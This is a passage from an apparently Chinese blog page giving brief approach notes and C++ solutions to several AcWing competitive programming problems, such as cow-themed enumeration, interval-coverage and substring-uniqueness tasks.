id="AcWing-1789-牛为什么过马路II"><a href="#AcWing-1789-牛为什么过马路II" class="headerlink" title="AcWing 1789. 牛为什么过马路II"></a><a href="acwing.com/problem/content/1791/">AcWing 1789. 牛为什么过马路II</a></h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>枚举26个字母，计算字母之间只出现一次的字母，这里借鉴大佬的思路，可以使用位运算，出现一次就是1，其余即为0，最后使用<code>bitset.count()</code>函数返回1的个数</p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string s;<br>    cin&gt;&gt;s;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++)<br>    &#123;<br>        bitset&lt;32&gt; bits;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c:s)<br>        &#123;<br>            bits[c-<span class="hljs-string">&#x27;A&#x27;</span>]=bits[c-<span class="hljs-string">&#x27;A&#x27;</span>]^<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(c-<span class="hljs-string">&#x27;A&#x27;</span>==i &amp;&amp; bits[i]==<span class="hljs-number">1</span>)<br>            &#123;<br>                bits=<span class="hljs-number">0</span>;<br>                bits[i]=<span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(c-<span class="hljs-string">&#x27;A&#x27;</span>==i &amp;&amp; bits[i]==<span class="hljs-number">0</span>)<br>            &#123;<br>                ans+=bits.<span class="hljs-built_in">count</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;ans/<span class="hljs-number">2</span>&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1776-牛的基因组学"><a href="#AcWing-1776-牛的基因组学" class="headerlink" title="AcWing 1776. 牛的基因组学"></a><a href="https://www.acwing.com/problem/content/description/1778/">AcWing 1776. 牛的基因组学</a></h2><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>依旧是枚举的思路，按照每个位置依次进行枚举。每次枚举的时候，首先把有斑点的牛都遍历一遍，把所有出现过的基因都记录为一个库序列；其次再对没有斑点的奶牛进行遍历，如果出现了在有斑点的基因库序列中没有的基因，则退出循环（条件不成立），如果第二个循环正常退出，则说明符合条件，累加结果即可。</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n,m,ans;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">110</span>;<br><br><br>string s1[MAXN],s2[MAXN];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)   cin&gt;&gt;s1[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)   cin&gt;&gt;s2[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> flag[<span class="hljs-number">30</span>], x=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(flag));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)   flag[s1[j][i] - <span class="hljs-string">&#x27;A&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            <span class="hljs-keyword">if</span>(flag[s2[j][i] - <span class="hljs-string">&#x27;A&#x27;</span>] == <span class="hljs-number">1</span>)<br>            &#123;<br>                x=<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        <span class="hljs-keyword">if</span>(x==<span class="hljs-number">0</span>)    ans++;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1762-牛的洗牌"><a href="#AcWing-1762-牛的洗牌" class="headerlink" title="AcWing 1762. 牛的洗牌"></a><a href="https://www.acwing.com/problem/content/1764/">AcWing 1762. 牛的洗牌</a></h2><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>题目给出排列后的顺序序列，要求还原出排列前的，因此我们可以按照给定的序列进行逆转即可，例如本来是奶牛从i位置去到j位置，现在逆向以后便成为了j位置的奶牛去i位置，假设用数组<code>a</code>保存序列，<code>b</code>序列记录最终位置，<code>c</code>序列记录三次逆序以后的位置。<br>由此可得，原来位于i位置的奶牛经过一次洗牌舞后会到<code>a[i]</code>位置，推理可得三次逆序后会到的位置序号为<code>a[a[a[i]]]</code>，因此编写程序对已知序列按照上述逻辑逆序即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(n+<span class="hljs-number">1</span>)</span>, <span class="hljs-title">b</span><span class="hljs-params">(n+<span class="hljs-number">1</span>)</span>, <span class="hljs-title">c</span><span class="hljs-params">(n+<span class="hljs-number">1</span>)</span></span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> j;<br>        cin&gt;&gt;j;<br>        a[j]=i;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        cin&gt;&gt;b[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        c[a[a[a[i]]]]=b[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>        cout&lt;&lt;c[i]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1750-救生员"><a href="#AcWing-1750-救生员" class="headerlink" title="AcWing 1750. 救生员"></a><a href="https://www.acwing.com/problem/content/1752/">AcWing 1750. 救生员</a></h2><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>本题主要分析方法也还是使用枚举的方法，逐个奶牛进行解雇后对区间覆盖长度（有效工作时间区间段）进行判断。</p><p>使用<code>last</code>变量记录上一个奶牛工作结束时间，如果当前奶牛开始的时间大于<code>last</code>，则其有效工作时间即为<code>[start, end]</code>；若结束时间大于<code>last</code>，则<code>[last, end]</code>为其有效工作时间。最后根据枚举结果输出最长覆盖长度即可。</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    vector&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">time</span>(n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        cin&gt;&gt;time[i].first&gt;&gt;time[i].second;<br>    <span class="hljs-built_in">sort</span>(time.<span class="hljs-built_in">begin</span>(), time.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> last=<span class="hljs-number">-1</span>, sum=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(j==i)    <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-type">int</span> start = time[j].first, end=time[j].second;<br>            <span class="hljs-keyword">if</span>(start &gt; last)<br>            &#123;<br>                sum+=end-start;<br>                last=end;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(last&lt;end)<br>            &#123;<br>                sum+=end-last;<br>                last=end;<br>            &#125;<br>        &#125;<br>        res=<span class="hljs-built_in">max</span>(res, sum);<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1460-我在哪？"><a href="#AcWing-1460-我在哪？" class="headerlink" title="AcWing 1460. 我在哪？"></a><a href="https://www.acwing.com/problem/content/1462/">AcWing 1460. 我在哪？</a></h2><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>枚举，利用<code>unordered_set</code>从短到长依次遍历尝试不同长度的串，如果能找到相同存在的则说明不可以唯一判定，即跳出循环，否则就可以认为当前长度可以唯一判断，直接输出即可。</p><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">int</span> i, j;<br>    string s;<br>    cin&gt;&gt;n&gt;&gt;s;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        unordered_set&lt;string&gt; S;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;=n-i;j++)<br>        &#123;<br>            string tmp = s.<span class="hljs-built_in">substr</span>(j, i);<br>            <span class="hljs-keyword">if</span>(S.<span class="hljs-built_in">count</span>(tmp))    <br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            S.<span class="hljs-built_in">insert</span>(tmp);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(j==n-i+<span class="hljs-number">1</span>)<br>        &#123;<br>            cout&lt;&lt;i&lt;&lt;endl;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1443-拍照"><a href="#AcWing-1443-拍照" class="headerlink" title="AcWing 1443. 拍照"></a><a href="https://www.acwing.com/problem/content/1445/">AcWing 1443. 拍照</a></h2><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>这里依然是使用枚举的方法，我们先假定已知了<code>a[1]</code>（由于要求字典序从小到大，这里通过从小到大枚举实现），然后便可以依照b与a的关系推出后续的各个数据。</p><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">1010</span>;<br><br><span class="hljs-type">int</span> a[MAXN], b[MAXN];<br><span class="hljs-type">int</span> flag[MAXN];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++)<br>        cin&gt;&gt;b[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;b[<span class="hljs-number">1</span>];i++)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span> ,<span class="hljs-built_in">sizeof</span>(flag));<br>        <span class="hljs-type">bool</span> res = <span class="hljs-literal">true</span>;<br>        a[<span class="hljs-number">1</span>]=i;<br>        flag[i]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">2</span>;j&lt;=n;j++)<br>        &#123;<br>            <span class="hljs-type">int</span> t=b[j<span class="hljs-number">-1</span>]-a[j<span class="hljs-number">-1</span>];<br>            <span class="hljs-keyword">if</span>(!flag[t] &amp;&amp; t&gt;=<span class="hljs-number">1</span> &amp;&amp; t&lt;=n)<br>            &#123;<br>                a[j]=t;<br>                flag[t]=<span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                res=<span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(res)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>                cout&lt;&lt;a[i]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1672-疯狂的科学"><a href="#AcWing-1672-疯狂的科学" class="headerlink" title="AcWing 1672. 疯狂的科学"></a><a href="https://www.acwing.com/problem/content/1674/">AcWing 1672. 疯狂的科学</a></h2><h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>枚举，分段找到连续的相反的一段，算作一次变换即可。</p><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>string a,b;<br><span class="hljs-type">int</span> n, res;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;a&gt;&gt;b;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(a[i] == b[i])    <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-type">int</span> j=i;<br>        <span class="hljs-keyword">while</span>(a[j]!=b[j])   j++;<br>        res++;<br>        i=j<span class="hljs-number">-1</span>;<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-1660-社交距离II"><a href="#AcWing-1660-社交距离II" class="headerlink" title="AcWing 1660. 社交距离II"></a><a href="https://www.acwing.com/problem/content/1662/">AcWing 1660. 社交距离II</a></h2><h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>枚举，双指针找最小范围</p><h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>vector&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; a;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> x,s;<br>        cin&gt;&gt;x&gt;&gt;s;<br>        a.<span class="hljs-built_in">push_back</span>(&#123;x, s&#125;);<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(a.<span class="hljs-built_in">begin</span>(), a.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">int</span> r=<span class="hljs-number">1e6</span>;<br>    <span class="hljs-type">int</span> s=a[<span class="hljs-number">0</span>].second;<span class="hljs-comment">//牛的生病状态</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(s!=a[i].second)<br>        &#123;<br>            r=<span class="hljs-built_in">min</span>(r, a[i].first-a[i<span class="hljs-number">-1</span>].first);<br>        &#125;<br>        s=a[i].second;<br>    &#125;<br>    r--;<br>    <br>    <span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(x==<span class="hljs-number">-1</span> &amp;&amp; a[i].second)    <br>        &#123;<br>            x=a[i].first;<br>            cnt++;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x!=<span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(a[i].first-x&lt;=r)<br>            &#123;<br>                x=a[i].first;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(a[i].second)<br>            &#123;<br>                cnt++;<br>                x=a[i].first;<br>            &#125;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;cnt&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="AcWing-3347-菊花链"><a href="#AcWing-3347-菊花链" class="headerlink" title="AcWing 3347. 菊花链"></a><a href="https://www.acwing.com/problem/content/3350/">AcWing 3347. 菊花链</a></h2><h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">110</span>;<br><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> p[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        cin&gt;&gt;p[i];<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        unordered_set&lt;<span class="hljs-type">int</span>&gt; H;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i, s=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            s+=p[j];<br>            H.<span class="hljs-built_in">insert</span>(p[j]);<br>            <span class="hljs-type">int</span> cnt = j-i+<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(s%cnt == <span class="hljs-number">0</span> &amp;&amp; H.<span class="hljs-built_in">count</span>(s/cnt))    res++;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3745-牛的学术圈-I-AcWing题库"><a 